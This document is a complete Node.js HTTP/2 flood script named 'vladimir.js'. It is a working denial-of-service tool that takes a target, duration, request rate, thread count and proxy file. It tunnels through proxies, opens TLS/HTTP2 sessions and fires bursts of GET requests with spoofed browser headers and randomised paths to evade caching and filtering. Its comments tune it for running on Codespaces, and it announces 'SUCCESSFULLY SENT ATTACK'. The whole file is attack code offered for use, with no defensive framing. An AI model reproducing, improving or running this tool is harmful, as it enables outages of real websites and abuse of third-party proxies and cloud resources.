
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const gradient = require("gradient-string");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// Handle errors silently unless debug is enabled
const debug = process.argv.includes('--debug');
process.on('uncaughtException', function (exception) {
    if (debug) {
        console.log(gradient.vice(`[ERROR] ${exception}`));
    }
});

if (process.argv.length < 7) {
    console.log(gradient.vice(`[!] node vladimir.js <HOST> <TIME> <RPS> <THREADS> <PROXY> [--debug] [--optimize-low]`));
    process.exit();
}

// New option for low-resource VPS optimization
const optimizeLow = process.argv.includes('--optimize-low');

const headers = {};
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const sig = [
    'ecdsa_secp256r1_sha256',
    'rsa_pss_rsae_sha256',
    'rsa_pkcs1_sha256'
];
const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384"
];
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
];
const lang_header = [
    'en-US,en;q=0.5',
    'vi-VN,vi;q=0.9,en-US;q=0.8'
];
const encoding_header = [
    'gzip, deflate',
    'br',
    '*'
];
const control_header = ["no-cache"];
const refers = [
    "https://www.google.com/",
    "https://www.facebook.com/"
];
const uap = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36"
];

var cipper = cplist[Math.floor(Math.random() * cplist.length)];
var siga = sig[Math.floor(Math.random() * sig.length)];
var uap1 = uap[Math.floor(Math.random() * uap.length)];
var Ref = refers[Math.floor(Math.random() * refers.length)];
var accept = accept_header[Math.floor(Math.random() * accept_header.length)];
var lang = lang_header[Math.floor(Math.random() * lang_header.length)];
var encoding = encoding_header[Math.floor(Math.random() * encoding_header.length)];
var control = control_header[Math.floor(Math.random() * control_header.length)];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

// HTTP status codes for logging
const httpStatusCodes = {
    "200": "OK",
    "301": "Moved Permanently",
    "302": "Found",
    "304": "Not Modified",
    "400": "Bad Request",
    "401": "Unauthorized",
    "403": "Forbidden",
    "404": "Not Found",
    "500": "Internal Server Error",
    "502": "Bad Gateway",
    "503": "Service Unavailable"
};

// Logging function with timestamp and gradient
function log(message) {
    if (!debug) return; // Skip logging unless debug is enabled
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
    console.log(gradient.vice(`[${hours}:${minutes}:${seconds}] ${message}`));
}

if (cluster.isMaster) {
    // Optimize threads for Codespaces
    if (optimizeLow) {
        args.threads = Math.min(args.threads, 2); // Limit to 2 threads for low-resource
        log("[INFO] Low-resource mode enabled: Limiting threads to 2 for Codespaces.");
    } else {
        args.threads = Math.min(args.threads, 4); // Max 4 threads for high performance
        log("[INFO] High-performance mode: Using up to 4 threads for Codespaces.");
    }
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, optimizeLow ? 50 : 100); // Faster interval for high rq/s
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(optimizeLow ? 15000 : 30000); // 15s timeout for low, 30s for high
        connection.setKeepAlive(true, optimizeLow ? 15000 : 30000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                if (debug) log(`[ERROR] Invalid response from proxy server`);
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            if (debug) log(`[ERROR] Timeout exceeded`);
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            if (debug) log(`[ERROR] ${error}`);
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(5);
headers[":scheme"] = "https";
headers["x-forwarded-proto"] = "https";
headers["accept-language"] = lang;
headers["accept-encoding"] = encoding;
headers["cache-control"] = control;
headers["sec-ch-ua"] = '"Chromium";v="114", "Google Chrome";v="114"';
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = "Windows";
headers["accept"] = accept;
headers["user-agent"] = uap1;
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "none";

async function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(10);
    headers["origin"] = "https://" + parsedTarget.host;

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100
    };

    Socker.HTTP(proxyOptions, async (connection, error) => {
        if (error) {
            if (debug) log(`[ERROR] ${error}`);
            return;
        }

        connection.setKeepAlive(true, optimizeLow ? 15000 : 30000);

        const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: siga,
            socket: connection,
            ciphers: cipper,
            ecdhCurve: "prime256v1",
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: "TLS_method"
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, optimizeLow ? 15000 : 30000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: optimizeLow ? 100 : 500, // Lower streams for stability
                initialWindowSize: optimizeLow ? 16384 : 32768,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            maxSessionMemory: optimizeLow ? 16000 : 32000,
            createConnection: () => tlsConn,
            socket: connection
        });

        client.on("connect", () => {
            // Send requests in bursts to maximize rq/s
            const sendRequests = async () => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                        .on("response", response => {
                            if (debug) {
                                const statusCode = response[':status'];
                                if (httpStatusCodes[statusCode]) {
                                    log(`[RESPONSE] ${statusCode} ${httpStatusCodes[statusCode]}`);
                                }
                            }
                            request.close();
                            request.destroy();
                        })
                        .on("error", error => {
                            if (debug) log(`[REQUEST ERROR] ${error}`);
                            request.close();
                            request.destroy();
                        });
                    request.end();
                }
            };

            // Run bursts every 100ms or 50ms
            const interval = setInterval(sendRequests, optimizeLow ? 50 : 100);
            client.on("close", () => clearInterval(interval));
        });

        client.on("error", error => {
            if (debug) log(`[CLIENT ERROR] ${error}`);
            client.destroy();
            connection.destroy();
        });
    });
}

console.log(gradient.vice(`[!] SUCCESSFULLY SENT ATTACK.`));
const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);